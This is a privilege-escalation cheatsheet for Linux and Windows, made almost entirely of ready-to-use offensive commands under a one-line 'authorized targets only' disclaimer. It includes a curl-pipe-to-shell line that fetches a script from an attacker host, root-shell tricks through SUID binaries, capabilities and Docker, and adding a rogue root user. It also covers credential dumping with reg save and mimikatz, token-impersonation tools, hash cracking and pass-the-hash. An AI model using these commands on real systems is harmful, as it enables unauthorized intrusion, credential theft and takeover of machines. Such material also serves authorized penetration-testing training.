# Cheatsheet · Privilege Escalation

> Authorized targets only. Enumerate first, escalate with the least-risky vector, then loot creds.

## Linux — enumerate
```bash
id; sudo -l; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
ss -tlnp; ip route                                 # local svcs / subnets
grep -rniE 'pass|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
# automated
curl http://ATTACKER/linpeas.sh | sh
./pspy64                                           # watch for root cron
```

## Linux — common escalations
```bash
sudo su -                                          # if NOPASSWD: ALL
# SUID via GTFOBins (example: find)
find . -exec /bin/sh -p \; -quit
# Capability cap_setuid on python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# Writable /etc/passwd -> add root user
openssl passwd -1 -salt x pass        # -> hash; append: root2:HASH:0:0::/root:/bin/bash
# Docker group escape
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# NFS no_root_squash: from attacker (root) drop a SUID shell into the export
```
```bash
# Crack recovered shadow
unshadow passwd shadow > h ; john --wordlist=rockyou.txt h
hashcat -m 1800 shadow.hash rockyou.txt
```

## Windows — enumerate
```powershell
whoami /all                       # privileges + groups (look for SeImpersonate!)
systeminfo                        # OS/patch level
net user; net localgroup administrators
.\winPEASany.exe quiet
powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
.\Seatbelt.exe -group=all
cmdkey /list                      # stored creds
```

## Windows — common escalations
```powershell
# SeImpersonatePrivilege -> SYSTEM
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato -cmd "cmd /c whoami"
# Unquoted service path / weak service perms (from PowerUp output)
# AlwaysInstallElevated -> malicious MSI
msiexec /quiet /qn /i evil.msi
# Dump SAM/LSASS for hashes
reg save HKLM\SAM sam; reg save HKLM\SYSTEM system    # then secretsdump offline
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```
```bash
# From attacker, with creds/hash
impacket-secretsdump 'DOM/user:pass@10.0.0.5'
nxc smb 10.0.0.5 -u user -p pass --sam --lsa
evil-winrm -i 10.0.0.5 -u admin -H <ntlm>            # pass-the-hash
```

## File hashing (proof of compromise)
```bash
md5sum flag.txt ; sha256sum flag.txt                 # Linux
```
```powershell
certutil -hashfile flag.txt SHA256                   # Windows
Get-FileHash flag.txt -Algorithm MD5
```

## Decision order
1. Creds/hashes already lying around → reuse.
2. sudo / SUID / capabilities / service / token misconfig.
3. Scheduled tasks / writable paths / DLL hijack.
4. Kernel exploit (last; can crash — match the target's libc/arch).
